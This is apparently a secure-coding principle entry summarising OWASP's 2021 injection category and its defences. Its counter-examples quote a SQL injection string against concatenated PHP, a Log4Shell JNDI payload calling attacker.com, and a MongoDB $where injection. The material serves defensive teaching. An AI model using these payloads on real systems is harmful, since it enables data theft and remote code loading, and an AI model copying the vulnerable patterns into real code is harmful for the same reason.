# OwaspInjection [principle] v1.0.0
OWASP Top 10 A03:2021 — injection vulnerabilities (SQL, NoSQL, OS command, LDAP, SSTI) occur when untrusted data is sent to an interpreter as part of a command or query.
> User-supplied input must never be concatenated into interpreter commands or queries. Use parameterized queries / prepared statements for SQL, structured APIs for OS commands, and output encoding for HTML/template contexts. Treat all external input as untrusted regardless of origin.
domain: security

## Attributed To
OWASP Foundation, Top 10 2021

## Applies To
- SQL and NoSQL query construction
- OS command execution (subprocess, exec, shell calls)
- LDAP and XPath queries
- Server-side template rendering (Jinja2, Twig, Pebble)
- XML/XPath input processing
- ORM raw() query escapes or annotate() with user input

## Counter Examples
- Classic PHP: `mysqli_query($conn, "SELECT * FROM users WHERE id='" . $_GET['id'] . "'")` — `id=1' OR '1'='1` dumps entire table.
- Log4Shell (CVE-2021-44228): logging `${jndi:ldap://attacker.com/a}` triggers JNDI lookup via log4j — user-controlled string interpreted as LDAP command.
- MongoDB $where with user input: `db.users.find({$where: 'this.username == "' + username + '"'})` — server-side JavaScript injection.
